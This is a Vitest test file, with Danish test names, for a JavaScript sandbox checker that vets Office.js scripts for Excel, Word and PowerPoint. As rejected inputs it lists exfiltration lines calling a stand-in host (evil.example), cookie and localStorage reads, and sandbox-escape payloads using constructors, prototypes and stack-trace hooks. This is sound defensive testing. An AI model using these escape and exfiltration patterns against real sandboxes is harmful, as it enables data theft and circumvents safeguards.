import { describe, expect, it } from "vitest";
import { checkScript, isBannedKey } from "./script.js";

const ok = (code: string) => {
  const r = checkScript(code);
  if (!r.ok) throw new Error(r.error);
  return r.code;
};
const bad = (code: string) => {
  const r = checkScript(code);
  expect(r.ok, code).toBe(false);
  return r.ok ? "" : r.error;
};

describe("checkScript (kodetilstandens sandkasse)", () => {
  it("tillader almindelig Office.js-kode", () => {
    ok(`
      const sheet = context.workbook.worksheets.getActiveWorksheet();
      const range = sheet.getRange("A1:C10");
      range.load("values");
      await context.sync();
      const total = range.values.slice(1).reduce((s, r) => s + Number(r[2] || 0), 0);
      const pivot = sheet.pivotTables.add("Pivot1", range, sheet.getRange("E1"));
      pivot.rowHierarchies.add(pivot.hierarchies.getItem("Region"));
      for (const [i, row] of range.values.entries()) { if (i > 0 && row[0] === "") break; }
      try { await context.sync(); } catch (e) { console.log(e.message); }
      const { values: vs = [] } = range;
      return \`Total: \${Math.round(total)} (\${vs.length} rækker), \${Excel.ChartType.columnClustered}\`;
    `);
  });

  it("afviser globale objekter, der kan nå netværk, DOM eller lager", () => {
    for (const code of [
      "fetch('https://evil.example/?d=' + 1)",
      "window.location = 'x'",
      "globalThis.fetch",
      "localStorage.getItem('miai.settings.v1')",
      "document.cookie",
      "new Image().src = 'https://evil.example'",
      "eval('1')",
      "Function('return this')()",
      "setTimeout(() => 1, 10)",
      "self.postMessage(1)",
      "arguments[0]",
    ])
      expect(bad(code), code).toMatch(/findes ikke i sandkassen/);
  });

  it("afviser veje ud via prototyper, this, klasser og import", () => {
    expect(bad("(() => 1).constructor('return fetch')()")).toMatch(/constructor/);
    expect(bad("context['constructor']")).toMatch(/constructor/);
    expect(bad("Object.getPrototypeOf(context)")).toMatch(/getPrototypeOf/);
    expect(bad("const { constructor: C } = context")).toMatch(/constructor/);
    expect(bad("({ __proto__: null })")).toMatch(/__proto__/);
    expect(bad("context._pendingRequest")).toMatch(/_pendingRequest/);
    expect(bad("context.m_context")).toMatch(/m_context/);
    expect(bad("Error.prepareStackTrace = (e, s) => s")).toMatch(/prepareStackTrace/);
    expect(bad("this.x")).toMatch(/this/);
    expect(bad("class A {}")).toMatch(/klasser/);
    expect(bad("import('x')")).toMatch(/import/);
    expect(bad("__key = (k) => k")).toMatch(/__key/);
    expect(bad("let x = (")).toMatch(/Syntaksfejl/);
  });

  it("blok-scope: et lokalt navn skjuler ikke et globalt uden for blokken", () => {
    ok("{ let fetch = 1; fetch += 1 }");
    expect(bad("{ let fetch = 1 } fetch('x')")).toMatch(/fetch/);
    ok("function f(name) { return name } f(1)");
    ok("for (let i = 0; i < 3; i++) { const status = i }");
    expect(bad("({ a: fetch } = { a: 1 })")).toMatch(/fetch/);
  });

  it("omskriver beregnede navne og løkker, så de tjekkes ved kørsel", () => {
    expect(ok("const k = 'a'; context[k]")).toContain("context[__key(k)]");
    expect(ok("const o = { [1 + 1]: 2 }")).toContain("[__key(1 + 1)]");
    expect(ok("while (true) break")).toContain("{__tick();break}");
    expect(ok("for (let i = 0; i < 2; i++) { i }")).toContain("{__tick(); i }");
    expect(isBannedKey("constructor")).toBe(true);
    expect(isBannedKey("_x")).toBe(true);
    expect(isBannedKey("values")).toBe(false);
    expect(isBannedKey(0)).toBe(false);
  });

  it("værtens objekt (#23): kun det, der hører til værten, findes i sandkassen", () => {
    expect(checkScript("return Word.InsertLocation.end", "Word").ok).toBe(true);
    expect(checkScript("return PowerPoint.ShapeType.placeholder", "PowerPoint").ok).toBe(true);
    expect(checkScript("return Excel.ChartType.line", "Word")).toMatchObject({ ok: false });
    expect(checkScript("return Word.InsertLocation.end")).toMatchObject({ ok: false });
    // De øvrige regler er de samme for alle værter.
    expect(checkScript("await fetch('https://x')", "Word")).toMatchObject({ ok: false });
    expect(checkScript("context.document.constructor", "PowerPoint")).toMatchObject({ ok: false });
  });
});
